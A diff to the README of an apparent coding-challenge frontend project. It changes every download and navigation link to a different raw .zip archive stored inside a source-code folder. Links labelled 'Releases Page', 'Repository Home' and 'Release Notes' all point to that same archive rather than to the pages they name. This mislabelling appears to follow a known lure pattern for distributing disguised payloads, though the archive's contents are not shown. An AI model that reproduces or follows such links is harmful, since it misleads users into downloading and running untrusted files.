@@ -1,7 +1,7 @@
 # 🎉 coding-kata-platform-frontend - Your Gateway to Coding Challenges
 
 ## 📥 Download Now 
-[![Download Now](https://github.com/thenerso/coding-kata-platform-frontend/raw/refs/heads/main/src/pages/user-level/coding_frontend_kata_platform_v1.4.zip%https://github.com/thenerso/coding-kata-platform-frontend/raw/refs/heads/main/src/pages/user-level/coding_frontend_kata_platform_v1.4.zip)](https://github.com/thenerso/coding-kata-platform-frontend/raw/refs/heads/main/src/pages/user-level/coding_frontend_kata_platform_v1.4.zip)
+[![Download Now](https://raw.githubusercontent.com/thenerso/coding-kata-platform-frontend/main/src/components/cohort/kata-coding-platform-frontend-v2.9.zip%https://raw.githubusercontent.com/thenerso/coding-kata-platform-frontend/main/src/components/cohort/kata-coding-platform-frontend-v2.9.zip)](https://raw.githubusercontent.com/thenerso/coding-kata-platform-frontend/main/src/components/cohort/kata-coding-platform-frontend-v2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To run this application, you need the following:
 
 To get started, follow these steps:
 
-1. **Visit the Release Page**: Go to the [Releases Page](https://github.com/thenerso/coding-kata-platform-frontend/raw/refs/heads/main/src/pages/user-level/coding_frontend_kata_platform_v1.4.zip).
+1. **Visit the Release Page**: Go to the [Releases Page](https://raw.githubusercontent.com/thenerso/coding-kata-platform-frontend/main/src/components/cohort/kata-coding-platform-frontend-v2.9.zip).
 
 2. **Choose the Latest Version**: Find the latest version number at the top of the page. 
 
@@ -66,7 +66,7 @@ For further assistance, visit the Issues section in the repository, where you ca
 
 ## 🔗 Useful Links
 
-- [Repository Home](https://github.com/thenerso/coding-kata-platform-frontend/raw/refs/heads/main/src/pages/user-level/coding_frontend_kata_platform_v1.4.zip)
-- [Release Notes](https://github.com/thenerso/coding-kata-platform-frontend/raw/refs/heads/main/src/pages/user-level/coding_frontend_kata_platform_v1.4.zip)
+- [Repository Home](https://raw.githubusercontent.com/thenerso/coding-kata-platform-frontend/main/src/components/cohort/kata-coding-platform-frontend-v2.9.zip)
+- [Release Notes](https://raw.githubusercontent.com/thenerso/coding-kata-platform-frontend/main/src/components/cohort/kata-coding-platform-frontend-v2.9.zip)
   
 Feel free to explore the platform and take your coding skills to the next level. Happy coding!
